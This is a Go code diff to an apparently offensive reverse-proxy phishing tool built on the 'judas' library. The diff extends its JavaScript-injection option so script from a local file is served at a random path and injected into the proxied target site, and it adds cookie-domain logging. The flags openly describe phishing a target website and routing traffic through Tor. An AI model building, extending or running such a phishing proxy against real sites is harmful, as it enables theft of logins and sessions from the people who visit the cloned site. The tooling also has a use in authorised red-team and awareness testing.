@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"crypto/tls"
 	"crypto/x509"
 	"errors"
@@ -9,12 +10,14 @@ import (
 	"github.com/becivells/judas"
 	"io/ioutil"
 	"log"
+	"math/rand"
 	"net/http"
 	_ "net/http/pprof"
 	"net/url"
 	"os"
 	"strconv"
 	"strings"
+	"time"
 )
 
 var (
@@ -22,12 +25,13 @@ var (
 	Commit         = "unknown"
 	Date           = "unknown"
 	Branch         = "unknown"
+	jsContent      []byte
 	sv             = flag.Bool("v", false, "show version")
 	targetURL      = flag.String("target", "", "The website we want to phish.")
 	address        = flag.String("address", "localhost:8080", "Address and port to run proxy service on. Format address:port.")
 	attachProfiler = flag.Bool("with-profiler", false, "Attach profiler to instance.")
 	proxyURL       = flag.String("proxy", "", "Optional upstream proxy. Useful for torification or debugging. Supports HTTPS and SOCKS5 based on the URL. For example, http://localhost:8080 or socks5://localhost:9150.")
-	javascriptURL  = flag.String("inject-js", "", "URL to a JavaScript file you want injected.")
+	javascriptURL  = flag.String("inject-js", "", "URL or file to a JavaScript file you want injected.")
 	insecure       = flag.Bool("insecure", false, "Listen without TLS.")
 	sourceInsecure = flag.Bool("insecure-target", false, "Not verify SSL certificate from target host.")
 	proxyCACert    = flag.String("proxy-ca-cert", "", "Proxy CA cert for signed requests")
@@ -50,6 +54,14 @@ func showVersion() {
 func exitWithError(message string) {
 	log.Println(message)
 	os.Exit(-1)
+}
+
+func FileExist(path string) bool {
+	_, err := os.Lstat(path)
+	if err != nil {
+		fmt.Println(err.Error())
+	}
+	return !os.IsNotExist(err)
 }
 
 func setupRequiredFlags() {
@@ -89,8 +101,44 @@ func getReverse(ReverseAddress string) (*judas.ReverseConfig, error) {
 	}
 	return nil, errors.New("不支持ipv6")
 }
+
+// RandChar random char
+func RandChar(size int) string {
+	char := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	rand.Seed(time.Now().UnixNano()) // 产生随机种子
+	var s bytes.Buffer
+	for i := 0; i < size; i++ {
+		s.WriteByte(char[rand.Int63()%int64(len(char))])
+	}
+	return s.String()
+}
 func main() {
 	setupRequiredFlags()
+
+	if *cookiesDomain != "" {
+		log.Printf("Use reverse domain %s\n", *cookiesDomain)
+	}
+
+	if *javascriptURL != "" {
+		jsURL := strings.Trim(*javascriptURL, " ")
+		if strings.HasPrefix(jsURL, "http") || strings.HasPrefix(jsURL, "https") {
+			log.Printf("use inject js form url: %s \n", jsURL)
+		} else if FileExist(jsURL) {
+			*javascriptURL = fmt.Sprintf("/%s.js", RandChar(8))
+			log.Printf("use inject js form file: %s URL: %s\n", jsURL, *javascriptURL)
+
+			b, err := ioutil.ReadFile(jsURL) // just pass the file name
+			if err != nil {
+				fmt.Print(err)
+			}
+			jsContent = b
+
+		} else {
+			log.Printf("uinject js : %s  error\n", jsURL)
+			os.Exit(1)
+		}
+	}
+
 	ReverseAddress, err := getReverse(*address)
 	if err != nil {
 		panic(err)
@@ -173,6 +221,13 @@ func main() {
 
 	if err != nil {
 		exitWithError(err.Error())
+	}
+
+	if jsContent != nil {
+		http.HandleFunc(*javascriptURL, func(w http.ResponseWriter, request *http.Request) {
+			w.Write(jsContent)
+			w.Header().Set("Content-Type", "application/javascript")
+		})
 	}
 
 	http.HandleFunc("/", phishingProxy.HandleRequests)
